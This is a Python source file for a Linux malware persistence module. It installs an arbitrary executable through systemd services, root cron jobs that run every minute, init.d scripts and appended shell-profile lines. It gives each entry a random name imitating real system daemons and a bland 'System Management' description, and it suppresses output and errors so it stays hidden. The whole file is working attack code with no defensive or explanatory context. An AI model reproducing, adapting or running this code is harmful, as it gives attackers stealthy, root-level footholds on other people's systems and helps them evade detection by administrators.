import os
import sys
import pwd
import grp
import stat
import shutil
import subprocess
from typing import List, Dict, Optional
from datetime import datetime
import random
import string

class LinuxPersistence:
    def __init__(self):
        self.startup_paths = self._get_startup_paths()
        
    def _get_startup_paths(self) -> List[str]:
        """Get Linux-specific startup paths"""
        return [
            os.path.expanduser('~/.config/autostart'),
            '/etc/xdg/autostart',
            '/etc/init.d',
            '/etc/systemd/system',
            '/usr/local/bin',
            '/etc/cron.d',
            '/var/spool/cron'
        ]
        
    def _generate_random_name(self, prefix: str = "") -> str:
        """Generate a random, legitimate-looking name"""
        system_services = [
            "systemd", "networkd", "journald", "logind",
            "timesyncd", "resolved", "daemon"
        ]
        
        if prefix:
            base = prefix
        else:
            base = random.choice(system_services)
            
        suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
        return f"{base}-{suffix}"
        
    def install_systemd(self, executable_path: str) -> bool:
        """Install as systemd service"""
        try:
            service_name = self._generate_random_name()
            service_path = f"/etc/systemd/system/{service_name}.service"
            
            service_content = f'''[Unit]
Description=System Management Daemon
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
'''
            
            # Write service file
            with open(service_path, 'w') as f:
                f.write(service_content)
                
            # Set permissions
            os.chmod(service_path, 0o644)
            
            # Enable and start service
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True)
            
            return True
        except:
            return False
            
    def install_cron(self, executable_path: str) -> bool:
        """Install via crontab"""
        try:
            cron_name = self._generate_random_name()
            cron_path = f"/etc/cron.d/{cron_name}"
            
            # Create cron entry that runs every minute
            cron_content = f"* * * * * root {executable_path} >/dev/null 2>&1\n"
            
            with open(cron_path, 'w') as f:
                f.write(cron_content)
                
            # Set correct permissions
            os.chmod(cron_path, 0o644)
            
            return True
        except:
            return False
            
    def install_init_script(self, executable_path: str) -> bool:
        """Install as init.d script"""
        try:
            script_name = self._generate_random_name()
            script_path = f"/etc/init.d/{script_name}"
            
            script_content = f'''#!/bin/sh
### BEGIN INIT INFO
# Provides:          {script_name}
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Management Service
### END INIT INFO

DAEMON="{executable_path}"
NAME="{script_name}"

case "$1" in
    start)
        $DAEMON &
        ;;
    stop)
        pkill -f "$DAEMON"
        ;;
    restart)
        $0 stop
        $0 start
        ;;
esac

exit 0
'''
            
            # Write init script
            with open(script_path, 'w') as f:
                f.write(script_content)
                
            # Set permissions
            os.chmod(script_path, 0o755)
            
            # Enable service
            subprocess.run(['update-rc.d', script_name, 'defaults'], capture_output=True)
            
            return True
        except:
            return False
            
    def install_profile(self, executable_path: str) -> bool:
        """Install in shell profile"""
        try:
            profile_paths = [
                os.path.expanduser('~/.profile'),
                os.path.expanduser('~/.bashrc'),
                os.path.expanduser('~/.zshrc'),
                '/etc/profile'
            ]
            
            command = f"\n# System Management\n({executable_path} &>/dev/null &)\n"
            
            for profile in profile_paths:
                if os.path.exists(profile):
                    with open(profile, 'a') as f:
                        f.write(command)
                        
            return True
        except:
            return False
            
    def install_all(self, executable_path: str) -> bool:
        """Try all persistence methods"""
        methods = [
            self.install_systemd,
            self.install_cron,
            self.install_init_script,
            self.install_profile
        ]
        
        success = False
        for method in methods:
            try:
                if method(executable_path):
                    success = True
            except:
                continue
                
        return success
